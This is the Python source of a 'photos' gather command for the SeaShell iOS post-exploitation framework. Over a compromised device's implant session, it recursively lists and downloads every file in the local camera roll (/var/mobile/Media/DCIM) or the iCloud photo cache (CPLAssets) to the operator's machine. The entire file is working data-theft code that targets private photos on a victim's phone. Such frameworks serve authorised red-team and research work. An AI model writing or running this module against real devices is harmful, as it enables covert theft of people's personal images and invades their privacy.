"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

import os

from pex.string import String

from pwny.api import *
from pwny.types import *

from badges.cmd import Command


class ExternalCommand(Command, String):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "photos",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Download photos available on device or iCloud.",
            'Usage': "photos [local|icloud] <local_path>",
            'MinArgs': 2
        })

    def recursive_walk(self, remote_path, local_path):
        result = self.session.send_command(
            tag=FS_LIST,
            args={
                TLV_TYPE_PATH: remote_path
            }
        )

        if result.get_int(TLV_TYPE_STATUS) == TLV_STATUS_SUCCESS:
            if not os.path.isdir(local_path):
                os.mkdir(local_path)

            file = result.get_tlv(TLV_TYPE_GROUP)

            while file:
                try:
                    hash = self.bytes_to_stat(file.get_raw(TLV_TYPE_BYTES))
                except Exception:
                    hash = {}

                file_type = self.mode_type(hash.get('st_mode', 0))
                path = file.get_string(TLV_TYPE_PATH)
                name = os.path.split(path)[1]
                if not self._safe_component(name):
                    file = result.get_tlv(TLV_TYPE_GROUP)
                    continue

                if file_type == 'file':
                    self.session.download(
                        path, local_path + '/' + name)

                elif file_type == 'directory':
                    self.recursive_walk(
                        path, local_path + '/' + name)

                file = result.get_tlv(TLV_TYPE_GROUP)

    @staticmethod
    def _safe_component(name):
        if not name or name in ('.', '..'):
            return False
        if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
            return False
        return True

    def run(self, args):
        if args[1] == 'icloud':
            path = '/var/mobile/Media/PhotoData/CPLAssets'
        else:
            path = '/var/mobile/Media/DCIM'

        result = self.session.send_command(
            tag=FS_STAT,
            args={
                TLV_TYPE_PATH: path
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(f"Photos can't be located!")
            return

        self.recursive_walk(path, args[2])
